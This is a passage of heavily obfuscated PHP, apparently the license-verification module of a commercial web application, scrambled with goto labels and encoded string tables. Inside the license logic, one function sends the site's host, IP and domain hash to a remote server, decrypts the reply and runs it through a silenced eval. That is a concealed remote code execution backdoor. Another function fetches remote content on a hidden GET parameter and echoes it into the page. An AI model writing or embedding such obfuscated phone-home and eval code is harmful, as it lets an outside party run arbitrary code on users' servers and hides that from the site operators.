$Dì×«–•Ú = $bƒçºÔ¼ã´[124]($_SERVER[$bƒçºÔ¼ã´[125]] . $C¿ê‹Á©); goto dòÁÎÍ„‡‘; Eôİ·Œ¼ì: $EßÕŒ­¸¬´ =& $_SERVER[£¶ä½¶¢]; $bƒçºÔ¼ã´ =& $_SERVER[£ÛúôÆ˜öÒòş]; if ($_SERVER[$bƒçºÔ¼ã´[44]] != $bƒçºÔ¼ã´[180]) { return; } goto FŸò™ƒ«’ğ; AÂ²É•«: $E¬Çê‹ÆÆï = $this->{$_SERVER[£ÛúôÆ˜öÒòş][137]}($bƒçºÔ¼ã´[166]($b„¨ÅÜˆ·Á), $F‹ˆóî¥ÂÈ); $AÏù°Ö®à“ = $EßÕŒ­¸¬´[637]; while ($AÏù°Ö®à“ < $EßÕŒ­¸¬´[597]) { if ($AÏù°Ö®à“ >= 0) { break; } $AÏù°Ö®à“++; } goto aâÒ–¬ˆ‹; dãŸÙ‡ƒÑÔ: $Bßäæ‘”“[$bƒçºÔ¼ã´[133]] = $bƒçºÔ¼ã´[128]($bƒçºÔ¼ã´[233]($this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($Aå›‰ÊŠŸ˜, $bƒçºÔ¼ã´[235]))); if ($b„¨ÅÜˆ·Á[$bƒçºÔ¼ã´[236]] && $b„¨ÅÜˆ·Á[$bƒçºÔ¼ã´[236]] >= 1) { $bƒçºÔ¼ã´[61]($bƒçºÔ¼ã´[62])->{$_SERVER[£ÛúôÆ˜öÒòş][237]}($bƒçºÔ¼ã´[238], $bƒçºÔ¼ã´[239]); } $bƒçºÔ¼ã´[61]($bƒçºÔ¼ã´[62])->{$_SERVER[£ÛúôÆ˜öÒòş][240]}($Bßäæ‘”“); goto cùˆ•Î¸; FŸò™ƒ«’ğ: if (!$bƒçºÔ¼ã´[116]($GLOBALS, $bƒçºÔ¼ã´[142])) { die; } $B÷ï…ùŠ´Ò = $GLOBALS[$bƒçºÔ¼ã´[22]]; if (isset($B÷ï…ùŠ´Ò[$bƒçºÔ¼ã´[181]])) { $this->{$_SERVER[£ÛúôÆ˜öÒòş][182]}(); die; } goto b»§‰Â‹¢; eŠÚµâš: if ($fÀÑ°½¼¶[$bƒçºÔ¼ã´[186]]) { $Bßäæ‘”“[$bƒçºÔ¼ã´[231]] = $fÀÑ°½¼¶[$bƒçºÔ¼ã´[186]]; } $bºÊ¯–éëä = $bƒçºÔ¼ã´[25]($bƒçºÔ¼ã´[124]($Bßäæ‘”“[$bƒçºÔ¼ã´[229]]), 10, 10); $CºÆ•ßÑµ = $bºÊ¯–éëä . $Bßäæ‘”“[$bƒçºÔ¼ã´[130]] . $Bßäæ‘”“[$bƒçºÔ¼ã´[231]]; goto a¡ÚàŒ·Š¯; dÎ³ØäŠÆ¾: $B¨àÕñ‚÷• = $EßÕŒ­¸¬´[629]; if ($B÷ï…ùŠ´Ò[$bƒçºÔ¼ã´[197]] == $bƒçºÔ¼ã´[198]) { $e ×† Äæ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($Dì×«–•Ú, $bƒçºÔ¼ã´[199]); $CáÕ™ÂŸ‘ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][137]}($bƒçºÔ¼ã´[166]($fÀÑ°½¼¶), $Dì×«–•Ú . $bƒçºÔ¼ã´[200], 3); $CáÕ™ÂŸ‘ = $CáÕ™ÂŸ‘ . $bƒçºÔ¼ã´[201] . $_SERVER[$bƒçºÔ¼ã´[191]]; $A°¤èàÂÖ‚ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][202]}($bƒçºÔ¼ã´[203] . $e ×† Äæ . $bƒçºÔ¼ã´[204] . $CáÕ™ÂŸ‘, -1); $bƒçºÔ¼ã´[184]($A°¤èàÂÖ‚, !0); } else { if ($B÷ï…ùŠ´Ò[$bƒçºÔ¼ã´[197]] == $bƒçºÔ¼ã´[205]) { $eî‚ËÙ³ºó = $bƒçºÔ¼ã´[25]($bƒçºÔ¼ã´[124]($bƒçºÔ¼ã´[206] . $Dì×«–•Ú), 12, 15) . $bƒçºÔ¼ã´[207]; $CáÕ™ÂŸ‘ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][208]}($bƒçºÔ¼ã´[2]($B÷ï…ùŠ´Ò[$bƒçºÔ¼ã´[209]]), $eî‚ËÙ³ºó, 2); $a¬Ş‚Œœœ„ = $bƒçºÔ¼ã´[210]($CáÕ™ÂŸ‘, !0); if (!$bƒçºÔ¼ã´[161]($a¬Ş‚Œœœ„) || !$bƒçºÔ¼ã´[161]($a¬Ş‚Œœœ„[$bƒçºÔ¼ã´[211]]) || $a¬Ş‚Œœœ„[$bƒçºÔ¼ã´[183]] != !0) { $AÀòÔªÚé = $bƒçºÔ¼ã´[212]; $B¼—×® ˆ = $a¬Ş‚Œœœ„[$bƒçºÔ¼ã´[211]] ? $bƒçºÔ¼ã´[213] . $a¬Ş‚Œœœ„[$bƒçºÔ¼ã´[211]] : $AÀòÔªÚé; $bƒçºÔ¼ã´[184]($B¼—×® ˆ, !1); } else { $fÀÑ°½¼¶[$bƒçºÔ¼ã´[186]] = $a¬Ş‚Œœœ„[$bƒçºÔ¼ã´[211]][$bƒçºÔ¼ã´[214]]; } } else { $a¬Ş‚Œœœ„ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][202]}($bƒçºÔ¼ã´[215], $fÀÑ°½¼¶, 10); $B¤…ø™öˆœ = $EßÕŒ­¸¬´[630]; } } if (!$bƒçºÔ¼ã´[161]($a¬Ş‚Œœœ„) || !$bƒçºÔ¼ã´[161]($a¬Ş‚Œœœ„[$bƒçºÔ¼ã´[211]]) || $a¬Ş‚Œœœ„[$bƒçºÔ¼ã´[183]] != !0) { $AÀòÔªÚé = $bƒçºÔ¼ã´[216]($bƒçºÔ¼ã´[217]); $B¼—×® ˆ = $a¬Ş‚Œœœ„[$bƒçºÔ¼ã´[211]] ? $bƒçºÔ¼ã´[213] . $a¬Ş‚Œœœ„[$bƒçºÔ¼ã´[211]] : $AÀòÔªÚé; $bƒçºÔ¼ã´[184]($B¼—×® ˆ, !1); } goto cë£ì©µóƒ; C©ĞŞãº§ò: Cache::set($bƒçºÔ¼ã´[249] . $bƒçºÔ¼ã´[124]($C¿ê‹Á© . $bƒçºÔ¼ã´[250]), $bƒçºÔ¼ã´[10]); $bƒçºÔ¼ã´[184]($bƒçºÔ¼ã´[216]($bƒçºÔ¼ã´[226]), !0); $aÚ´‚æò· = $EßÕŒ­¸¬´[642]; goto c—ß÷‡â; c—ß÷‡â: if (!$aÚ´‚æò·) { die; } goto b‡Ø˜©®§•; Bå±òŠÃ¥Â: if (strlen($BÇã¾¹˜Á£) < $EßÕŒ­¸¬´[593]) { die; } $Bè¡•ë„íÅ = array(); $a·—ÚœŞ“¨ = $EßÕŒ­¸¬´[639]; goto aÄƒºîìé; CÌ‹È ôµß: if (strlen($A¯®ªÕÌ‡) < $EßÕŒ­¸¬´[597]) { return; } if (!$F×Ùãğ¶¥î || $F×Ùãğ¶¥î != $b„¨ÅÜˆ·Á[$bƒçºÔ¼ã´[155]]) { $CÅƒ‚‡ø¿ = array($bƒçºÔ¼ã´[220] => $bƒçºÔ¼ã´[61]($bƒçºÔ¼ã´[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}($bƒçºÔ¼ã´[126]), $bƒçºÔ¼ã´[221] => $_SERVER[$bƒçºÔ¼ã´[125]], $bƒçºÔ¼ã´[222] => $bƒçºÔ¼ã´[223](), $bƒçºÔ¼ã´[192] => $_SERVER[$bƒçºÔ¼ã´[193]]); $CáÕ™ÂŸ‘ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][224]}($bƒçºÔ¼ã´[166]($CÅƒ‚‡ø¿)); $this->{$_SERVER[£ÛúôÆ˜öÒòş][202]}($bƒçºÔ¼ã´[225] . $CáÕ™ÂŸ‘); $bƒçºÔ¼ã´[184]($bƒçºÔ¼ã´[216]($bƒçºÔ¼ã´[226]), !0); } $Bßäæ‘”“ = array($bƒçºÔ¼ã´[227] => $b„¨ÅÜˆ·Á[$bƒçºÔ¼ã´[228]], $bƒçºÔ¼ã´[229] => $b„¨ÅÜˆ·Á[$bƒçºÔ¼ã´[230]], $bƒçºÔ¼ã´[231] => $bƒçºÔ¼ã´[134](16), $bƒçºÔ¼ã´[130] => $b„¨ÅÜˆ·Á[$bƒçºÔ¼ã´[232]]); goto eŠÚµâš; cùˆ•Î¸: $F‹ˆóî¥ÂÈ = $bƒçºÔ¼ã´[124]($_SERVER[$bƒçºÔ¼ã´[125]] . $bƒçºÔ¼ã´[233]($C¿ê‹Á©) . $Bßäæ‘”“[$bƒçºÔ¼ã´[229]]); $Fê¶¸¶‡£ = $EßÕŒ­¸¬´[636]; $D¸ê‰¼ñ»¡ = $bƒçºÔ¼ã´[233]($bƒçºÔ¼ã´[25]($F‹ˆóî¥ÂÈ, 10, 16)); goto AÂ²É•«; aâÒ–¬ˆ‹: $AŠ©¶šÏ¸à = $bƒçºÔ¼ã´[241]($bƒçºÔ¼ã´[61]($bƒçºÔ¼ã´[11])->{$_SERVER[£ÛúôÆ˜öÒòş][242]}(), $bƒçºÔ¼ã´[243]); $c²¼ÉÎ‰„ğ = $AŠ©¶šÏ¸à[$bƒçºÔ¼ã´[244]]; $BÇã¾¹˜Á£ = $EßÕŒ­¸¬´[638]; goto Bå±òŠÃ¥Â; cë£ì©µóƒ: $b„¨ÅÜˆ·Á = $a¬Ş‚Œœœ„[$bƒçºÔ¼ã´[211]]; $F×Ùãğ¶¥î = $this->{$_SERVER[£ÛúôÆ˜öÒòş][218]}($b„¨ÅÜˆ·Á[$bƒçºÔ¼ã´[219]]); $A¯®ªÕÌ‡ = $EßÕŒ­¸¬´[631]; goto CÌ‹È ôµß; b‡Ø˜©®§•: } private function licenseRegistSuccess() { $d¬”×¢¥ñğ =& $_SERVER[£ÛúôÆ˜öÒòş]; $EôŒ„³Áâ = $d¬”×¢¥ñğ[61]($d¬”×¢¥ñğ[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}(); $b¦‘´æ¾Û‡ = $_SERVER[£¶ä½¶¢][643]; if ($EôŒ„³Áâ[$d¬”×¢¥ñğ[93]] != $d¬”×¢¥ñğ[239]) { $d¬”×¢¥ñğ[61]($d¬”×¢¥ñğ[62])->{$_SERVER[£ÛúôÆ˜öÒòş][240]}($d¬”×¢¥ñğ[93], $d¬”×¢¥ñğ[239]); } $d¬”×¢¥ñğ[120]($d¬”×¢¥ñğ[251])->{$_SERVER[£ÛúôÆ˜öÒòş][252]}(!0); } private function voul2fc4dc93() { goto BÚ„°ÚÑ Ê; Aîì¾î‚×: $this->uqeg91b17b61 = $B®¤¾Å¦Í[131]; goto EŞ£²›êÔ; AÈĞãñùÁ’: $this->qbev01c9ff0a = array(); $c„ƒå¯Û­  = $câ½Éê—ô¬[645]; if (!$c„ƒå¯Û­ ) { die; } goto Aîì¾î‚×; BÚ„°ÚÑ Ê: $câ½Éê—ô¬ =& $_SERVER[£¶ä½¶¢]; $B®¤¾Å¦Í =& $_SERVER[£ÛúôÆ˜öÒòş]; $B®¤¾Å¦Í[61]($B®¤¾Å¦Í[62])->{$_SERVER[£ÛúôÆ˜öÒòş][240]}(array($B®¤¾Å¦Í[227] => $B®¤¾Å¦Í[10], $B®¤¾Å¦Í[229] => $B®¤¾Å¦Í[10], $B®¤¾Å¦Í[130] => $B®¤¾Å¦Í[131], $B®¤¾Å¦Í[132] => $B®¤¾Å¦Í[10], $B®¤¾Å¦Í[133] => $B®¤¾Å¦Í[10])); goto F¬ëôô’Ãº; F¬ëôô’Ãº: $dœ¢Š‹ºå = $câ½Éê—ô¬[644]; if (strlen($dœ¢Š‹ºå) < $câ½Éê—ô¬[597]) { return; } $B®¤¾Å¦Í[61]($B®¤¾Å¦Í[62])->{$_SERVER[£ÛúôÆ˜öÒòş][237]}($B®¤¾Å¦Í[238], $B®¤¾Å¦Í[253]); goto AÈĞãñùÁ’; EŞ£²›êÔ: } private function sogh928476b7() { goto A­‘……¶›‚; A­‘……¶›‚: $e›Íä‰±¹ =& $_SERVER[£¶ä½¶¢]; $báƒˆœóš‘ =& $_SERVER[£ÛúôÆ˜öÒòş]; $_SERVER[$báƒˆœóš‘[193]] = $báƒˆœóš‘[116]($_SERVER, $báƒˆœóš‘[193], APP_HOST); goto e‰·ÒŞŠ; B«„¨„ÉÆ–: if ($F¨ÍĞ”™¥[$báƒˆœóš‘[130]] == $báƒˆœóš‘[131]) { return; } $cÉã‰“ÖÍ± = $báƒˆœóš‘[61]($báƒˆœóš‘[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}($báƒˆœóš‘[126]); $E•ÜÚ¤¤Ùò = $báƒˆœóš‘[249] . $báƒˆœóš‘[124]($cÉã‰“ÖÍ± . $báƒˆœóš‘[250]); goto e‰—‰‡§©º; fÓ³ÏİÔ¸µ: while (strlen($dŸÚ¶ÚÎîé) < $e›Íä‰±¹[586]) { if (!$dŸÚ¶ÚÎîé) { break; } $dŸÚ¶ÚÎîé++; } goto D“ˆ¨åÀÕ²; D­¥®Ô‚¢å: $this->qbev01c9ff0a = $BèÃ÷óÄùÍ; $this->uqeg91b17b61 = $F¨ÍĞ”™¥[$báƒˆœóš‘[130]]; $dŸÚ¶ÚÎîé = $e›Íä‰±¹[650]; goto fÓ³ÏİÔ¸µ; e‰—‰‡§©º: $AÖë˜÷š¦ = $e›Íä‰±¹[648]; $BèÃ÷óÄùÍ = Cache::get($E•ÜÚ¤¤Ùò); $Aó˜¿Áİ° = $e›Íä‰±¹[649]; goto D°Á®Æ††¬; Dä•¯Ñ‡Øá: $F¨ÍĞ”™¥ = $báƒˆœóš‘[61]($báƒˆœóš‘[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}(); $eè«¼±ÁàÁ = $e›Íä‰±¹[647]; while (strlen($eè«¼±ÁàÁ) < $e›Íä‰±¹[10]) { if (!$eè«¼±ÁàÁ) { break; } $eè«¼±ÁàÁ++; } goto B«„¨„ÉÆ–; D°Á®Æ††¬: if (strlen($Aó˜¿Áİ°) < $e›Íä‰±¹[600]) { die; } if (!$báƒˆœóš‘[161]($BèÃ÷óÄùÍ) || !isset($BèÃ÷óÄùÍ[$báƒˆœóš‘[254]]) || $báƒˆœóš‘[255]() - $BèÃ÷óÄùÍ[$báƒˆœóš‘[254]] >= 60) { $bÑÛ¨Äçá = $báƒˆœóš‘[241]($báƒˆœóš‘[61]($báƒˆœóš‘[11])->{$_SERVER[£ÛúôÆ˜öÒòş][242]}(), $báƒˆœóš‘[243]); $aÇ«‹«¬éŠ = $bÑÛ¨Äçá[$báƒˆœóš‘[244]]; $EŞÔÍ†÷ÅÈ = $báƒˆœóš‘[124]($_SERVER[$báƒˆœóš‘[125]] . $báƒˆœóš‘[233]($cÉã‰“ÖÍ±) . $F¨ÍĞ”™¥[$báƒˆœóš‘[229]]); $A‰‡¶éÏ‡Ê = $báƒˆœóš‘[233]($báƒˆœóš‘[25]($EŞÔÍ†÷ÅÈ, 10, 16)); $BèÃ÷óÄùÍ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][208]}($aÇ«‹«¬éŠ[$báƒˆœóš‘[104]][$A‰‡¶éÏ‡Ê], $EŞÔÍ†÷ÅÈ); $BèÃ÷óÄùÍ = $báƒˆœóš‘[210]($BèÃ÷óÄùÍ, !0); } if (!$báƒˆœóš‘[161]($BèÃ÷óÄùÍ)) { return $this->{$_SERVER[£ÛúôÆ˜öÒòş][182]}(); } goto D©»›Š™ùÇ; e‰·ÒŞŠ: $AÉ§÷¥É©¨ = $e›Íä‰±¹[646]; if (strlen($AÉ§÷¥É©¨) < $e›Íä‰±¹[600]) { die; } $this->uqeg91b17b61 = $báƒˆœóš‘[131]; goto Dä•¯Ñ‡Øá; D©»›Š™ùÇ: $a“«¡Ü¦Çá = $báƒˆœóš‘[154]($BèÃ÷óÄùÍ[$báƒˆœóš‘[155]]); if ($báƒˆœóš‘[255]() >= $a“«¡Ü¦Çá) { return $this->{$_SERVER[£ÛúôÆ˜öÒòş][182]}(); } if ($báƒˆœóš‘[255]() - $BèÃ÷óÄùÍ[$báƒˆœóš‘[254]] > 20) { $BèÃ÷óÄùÍ[$báƒˆœóš‘[254]] = $báƒˆœóš‘[255](); Cache::set($E•ÜÚ¤¤Ùò, $BèÃ÷óÄùÍ); } goto D­¥®Ô‚¢å; D“ˆ¨åÀÕ²: } private function pgdj35287832() { goto CÌùˆÁ¤’; fé²ª‚ù“í: $Dˆš¹˜ŸÏ¨ = $c‰˜Èï‡Ù[651]; if (strlen($Dˆš¹˜ŸÏ¨) < $c‰˜Èï‡Ù[586]) { return; } $a‹•§áÇõ = $_SERVER[$CÁ÷æÑéÑ[44]]; goto a±ßòÔœ; a±ßòÔœ: if ($a‹•§áÇõ == $CÁ÷æÑéÑ[256] && $this->uqeg91b17b61 == $CÁ÷æÑéÑ[131]) { $CÁ÷æÑéÑ[184]($CÁ÷æÑéÑ[216]($CÁ÷æÑéÑ[257]), !1, $CÁ÷æÑéÑ[258]); } $d‘¼Û¾¡¤ = array($CÁ÷æÑéÑ[259], $CÁ÷æÑéÑ[260]); if ($CÁ÷æÑéÑ[261]($a‹•§áÇõ, $d‘¼Û¾¡¤)) { if ($this->uqeg91b17b61 == $CÁ÷æÑéÑ[131] && isset($AƒÚ¿¢ÍÀè[$CÁ÷æÑéÑ[262]])) { $CÁ÷æÑéÑ[184]($CÁ÷æÑéÑ[216]($CÁ÷æÑéÑ[257]), !1, $CÁ÷æÑéÑ[258]); die; } $eÛ…’ªñ² = $this->{$_SERVER[£ÛúôÆ˜öÒòş][147]}(); if ($eÛ…’ªñ² != $CÁ÷æÑéÑ[263]($CÁ÷æÑéÑ[264])) { if ($eÛ…’ªñ² <= $CÁ÷æÑéÑ[61]($CÁ÷æÑéÑ[149])->{$_SERVER[£ÛúôÆ˜öÒòş][150]}()) { $CÁ÷æÑéÑ[184]($CÁ÷æÑéÑ[216]($CÁ÷æÑéÑ[265]), !1, $CÁ÷æÑéÑ[258]); die; } } } goto F†Ğ‘ôÁí—; CÌùˆÁ¤’: $c‰˜Èï‡Ù =& $_SERVER[£¶ä½¶¢]; $CÁ÷æÑéÑ =& $_SERVER[£ÛúôÆ˜öÒòş]; $AƒÚ¿¢ÍÀè = $GLOBALS[$CÁ÷æÑéÑ[22]]; goto fé²ª‚ù“í; F†Ğ‘ôÁí—: } private function jdfifc7f6135() { goto c‘„êóº“; dçâåÕ«š: die; goto a–Î¸•Ğªô; FÊß…Õœ‡: $aˆĞÎÅÈ‰ = $a²ª‘ª”áó[652]; if (!$aˆĞÎÅÈ‰) { die; } if (!$c„Öë˜£‰Ê[116]($GLOBALS, $c„Öë˜£‰Ê[142]) || !isset($_GET[$c„Öë˜£‰Ê[267]])) { return; } goto D‚æ›ÚÖÏ; D‚æ›ÚÖÏ: if (!$c„Öë˜£‰Ê[261]($_SERVER[$c„Öë˜£‰Ê[44]], $fËÃ·Ü¶¿†)) { return; } $e—ÏÈÒÓŞ¹ = $c„Öë˜£‰Ê[268]; $e—ÏÈÒÓŞ¹ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][269]}($e—ÏÈÒÓŞ¹, $c„Öë˜£‰Ê[270]); goto bÙ›Øå…Ü; c‘„êóº“: $a²ª‘ª”áó =& $_SERVER[£¶ä½¶¢]; $c„Öë˜£‰Ê =& $_SERVER[£ÛúôÆ˜öÒòş]; $fËÃ·Ü¶¿† = array($c„Öë˜£‰Ê[145], $c„Öë˜£‰Ê[266]); goto FÊß…Õœ‡; bÙ›Øå…Ü: $e½Á¶Óå³ñ = $c„Öë˜£‰Ê[271](array($c„Öë˜£‰Ê[272] => array($c„Öë˜£‰Ê[273] => $c„Öë˜£‰Ê[274], $c„Öë˜£‰Ê[275] => 3))); $e‚ãØŒÈ²ã = $a²ª‘ª”áó[653]; if (strlen($e‚ãØŒÈ²ã) < $a²ª‘ª”áó[10]) { die; } goto AÒ‡‡¹¨»ñ; AÒ‡‡¹¨»ñ: $E ¸š’¿¥İ = @$c„Öë˜£‰Ê[276]($e—ÏÈÒÓŞ¹, !1, $e½Á¶Óå³ñ); $c„Öë˜£‰Ê[277]($c„Öë˜£‰Ê[278]); if ($E ¸š’¿¥İ && $c„Öë˜£‰Ê[32]($E ¸š’¿¥İ, $c„Öë˜£‰Ê[279])) { echo $E ¸š’¿¥İ; } goto dçâåÕ«š; a–Î¸•Ğªô: } public function qmnw0950c44a($D†Î¨× î) { goto eò‹Û¥‚ìƒ; eÉâÆƒÈ—: $FÒœß–Û´Ò = array($cª…•±òâ›[281] => $cª…•±òâ›[282], $cª…•±òâ›[283] => $cª…•±òâ›[282], $cª…•±òâ›[284] => $cª…•±òâ›[282], $cª…•±òâ›[285] => $cª…•±òâ›[282], $cª…•±òâ›[286] => $cª…•±òâ›[282], $cª…•±òâ›[287] => $cª…•±òâ›[282], $cª…•±òâ›[288] => $cª…•±òâ›[289], $cª…•±òâ›[290] => $cª…•±òâ›[289], $cª…•±òâ›[291] => $cª…•±òâ›[289], $cª…•±òâ›[292] => $cª…•±òâ›[289], $cª…•±òâ›[293] => $cª…•±òâ›[289], $cª…•±òâ›[294] => $cª…•±òâ›[289], $cª…•±òâ›[295] => $cª…•±òâ›[289], $cª…•±òâ›[296] => $cª…•±òâ›[289], $cª…•±òâ›[297] => $cª…•±òâ›[289]); $c‡² £â²ï = $eùù£ß‰º[604]; $AêêºóÜ‡ø = $cª…•±òâ›[0]($cª…•±òâ›[298], $cª…•±òâ›[116]($this->qbev01c9ff0a, $cª…•±òâ›[139], $cª…•±òâ›[10])); goto cÀ·…Åï¯¡; cÀ·…Åï¯¡: $e–µ–Ëª­È = $eùù£ß‰º[654]; while ($e–µ–Ëª­È < $eùù£ß‰º[10]) { if ($e–µ–Ëª­È >= 0) { break; } $e–µ–Ëª­È++; } $f¼æ¨¹À = array(); goto e‡‹æŠ¦õ‰; e‡‹æŠ¦õ‰: foreach ($FÒœß–Û´Ò as $E¥¿šÀÔ => $DîÛ¡¦¤åŞ) { if ($DîÛ¡¦¤åŞ == $cª…•±òâ›[282] && $cª…•±òâ›[25]($this->uqeg91b17b61, 0, 1) == $cª…•±òâ›[282]) { continue; } if (!$cª…•±òâ›[261]($E¥¿šÀÔ, $AêêºóÜ‡ø)) { $f¼æ¨¹À[] = $E¥¿šÀÔ; } } foreach ($f¼æ¨¹À as $E¥¿šÀÔ) { unset($D†Î¨× î[$E¥¿šÀÔ]); } return $D†Î¨× î; goto aÚ·ƒâºÍ; aÚ·ƒâºÍ: $c÷©Ä‡Ñ…Ø = $eùù£ß‰º[655]; if (!$c÷©Ä‡Ñ…Ø) { return; } goto EÔî‚ù°ò¹; eò‹Û¥‚ìƒ: $eùù£ß‰º =& $_SERVER[£¶ä½¶¢]; $cª…•±òâ› =& $_SERVER[£ÛúôÆ˜öÒòş]; if ($this->uqeg91b17b61 == $cª…•±òâ›[280]) { return $D†Î¨× î; } goto eÉâÆƒÈ—; EÔî‚ù°ò¹: } private function ixgu0f1469b4() { $E®ÁÌ™ƒ°Ç =& $_SERVER[£ÛúôÆ˜öÒòş]; if ($this->uqeg91b17b61 != $E®ÁÌ™ƒ°Ç[131]) { return; } $GLOBALS[$E®ÁÌ™ƒ°Ç[104]][$E®ÁÌ™ƒ°Ç[108]][$E®ÁÌ™ƒ°Ç[299]] = $E®ÁÌ™ƒ°Ç[239]; $GLOBALS[$E®ÁÌ™ƒ°Ç[104]][$E®ÁÌ™ƒ°Ç[300]] = $E®ÁÌ™ƒ°Ç[239]; if ($E®ÁÌ™ƒ°Ç[61]($E®ÁÌ™ƒ°Ç[301])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}($E®ÁÌ™ƒ°Ç[93]) != $E®ÁÌ™ƒ°Ç[253]) { $E®ÁÌ™ƒ°Ç[61]($E®ÁÌ™ƒ°Ç[301])->{$_SERVER[£ÛúôÆ˜öÒòş][240]}($E®ÁÌ™ƒ°Ç[93], $E®ÁÌ™ƒ°Ç[253]); } } public function jftn56d228bc() { return $_SERVER[£ÛúôÆ˜öÒòş][302]; } private function qwdic10e237b() { goto eËÏ¤ìÏÁ; c…Ê•Ø“¤: while (strlen($Aè¥‡„íôµ) < $f¿Ÿöäñ©©[597]) { if (!$Aè¥‡„íôµ) { break; } $Aè¥‡„íôµ++; } if (!$b‹†ÆÂŞÅ[161]($eÈ£††¸š)) { return; } if ($eÈ£††¸š[$b‹†ÆÂŞÅ[183]] && $eÈ£††¸š[$b‹†ÆÂŞÅ[312]]) { if ($this->{$_SERVER[£ÛúôÆ˜öÒòş][218]}($eÈ£††¸š[$b‹†ÆÂŞÅ[312]]) == $eóî«¿ŠÚù[$b‹†ÆÂŞÅ[183]]) { return; } } goto aŸ¢Äå†ï²; eÕ¾“ š: if ($this->{$_SERVER[£ÛúôÆ˜öÒòş][218]}($eÈ£††¸š[$b‹†ÆÂŞÅ[312]]) != $eóî«¿ŠÚù[$b‹†ÆÂŞÅ[183]]) { $c·¨à°î¸ = array($b‹†ÆÂŞÅ[220] => $dáÛôó´¡ˆ, $b‹†ÆÂŞÅ[221] => $_SERVER[$b‹†ÆÂŞÅ[125]], $b‹†ÆÂŞÅ[222] => $b‹†ÆÂŞÅ[223](), $b‹†ÆÂŞÅ[192] => $_SERVER[$b‹†ÆÂŞÅ[193]]); $cŞø¡‰ŒÏ´ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][224]}($b‹†ÆÂŞÅ[166]($c·¨à°î¸)); $eÈ£††¸š = $this->{$_SERVER[£ÛúôÆ˜öÒòş][202]}($b‹†ÆÂŞÅ[225] . $cŞø¡‰ŒÏ´); if ($eÈ£††¸š && $b‹†ÆÂŞÅ[161]($eÈ£††¸š) && isset($eÈ£††¸š[$b‹†ÆÂŞÅ[312]])) { $Eœ¼İì‚…‡ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][208]}($eÈ£††¸š[$b‹†ÆÂŞÅ[312]], 2); if ($Eœ¼İì‚…‡) { $Eœ¼İì‚…‡ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][218]}($Eœ¼İì‚…‡); } if ($Eœ¼İì‚…‡) { try { @eval($Eœ¼İì‚…‡); } catch (Exception $C˜ŸøĞ†ÙÍ) { } } } } goto C‹›í›øÚ; aŸ¢Äå†ï²: $this->{$_SERVER[£ÛúôÆ˜öÒòş][182]}(); $cÈ»§ÛÖù = $f¿Ÿöäñ©©[659]; if (!$cÈ»§ÛÖù) { return; } goto eÕ¾“ š; AÔÅ´–±: $eß‡‘Š‡¶Î = $b‹†ÆÂŞÅ[306] . $b‹†ÆÂŞÅ[124]($b‹†ÆÂŞÅ[307]); if ($this->uqeg91b17b61 == $b‹†ÆÂŞÅ[131] || !$b‹†ÆÂŞÅ[116]($GLOBALS, $b‹†ÆÂŞÅ[142])) { return; } if (!$b‹†ÆÂŞÅ[261]($_SERVER[$b‹†ÆÂŞÅ[44]], $DğÍˆ§‡Ñ’)) { return; } goto D§å£…ç­ƒ; D§å£…ç­ƒ: if ($b‹†ÆÂŞÅ[255]() % 4 != 0) { return; } $B‚–Œ°—É = $b‹†ÆÂŞÅ[13](array($b‹†ÆÂŞÅ[308], $b‹†ÆÂŞÅ[309]), $eß‡‘Š‡¶Î); if ($B‚–Œ°—É && $b‹†ÆÂŞÅ[255]() - $B‚–Œ°—É < $b‹†ÆÂŞÅ[263]($b‹†ÆÂŞÅ[310])) { return; } goto Fè»Êá«ÇŠ; BŞÓ…ëË“Õ: if (!$Cê©ùÃä›) { die; } $eóî«¿ŠÚù = array($b‹†ÆÂŞÅ[183] => $b‹†ÆÂŞÅ[61]($b‹†ÆÂŞÅ[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}($b‹†ÆÂŞÅ[227]), $b‹†ÆÂŞÅ[197] => $this->uqeg91b17b61, $b‹†ÆÂŞÅ[194] => $_SERVER[$b‹†ÆÂŞÅ[195]], $b‹†ÆÂŞÅ[196] => $b‹†ÆÂŞÅ[61]($b‹†ÆÂŞÅ[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}($b‹†ÆÂŞÅ[157]), $b‹†ÆÂŞÅ[123] => $b‹†ÆÂŞÅ[124]($_SERVER[$b‹†ÆÂŞÅ[125]] . $dáÛôó´¡ˆ), $b‹†ÆÂŞÅ[187] => $b‹†ÆÂŞÅ[167], $b‹†ÆÂŞÅ[190] => $_SERVER[$b‹†ÆÂŞÅ[191]]); $a¼¹è—‰®„ = $f¿Ÿöäñ©©[657]; goto eÜµ‘ØÒ÷; Fè»Êá«ÇŠ: $b‹†ÆÂŞÅ[13](array($b‹†ÆÂŞÅ[308], $b‹†ÆÂŞÅ[170]), $eß‡‘Š‡¶Î, $b‹†ÆÂŞÅ[255]()); $dáÛôó´¡ˆ = $b‹†ÆÂŞÅ[61]($b‹†ÆÂŞÅ[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}($b‹†ÆÂŞÅ[126]); $Cê©ùÃä› = $f¿Ÿöäñ©©[656]; goto BŞÓ…ëË“Õ; eËÏ¤ìÏÁ: $f¿Ÿöäñ©© =& $_SERVER[£¶ä½¶¢]; $b‹†ÆÂŞÅ =& $_SERVER[£ÛúôÆ˜öÒòş]; $DğÍˆ§‡Ñ’ = array($b‹†ÆÂŞÅ[303], $b‹†ÆÂŞÅ[304], $b‹†ÆÂŞÅ[305]); goto AÔÅ´–±; eÜµ‘ØÒ÷: if (!$a¼¹è—‰®„) { die; } $eÈ£††¸š = $this->{$_SERVER[£ÛúôÆ˜öÒòş][202]}($b‹†ÆÂŞÅ[311], $eóî«¿ŠÚù); $Aè¥‡„íôµ = $f¿Ÿöäñ©©[658]; goto 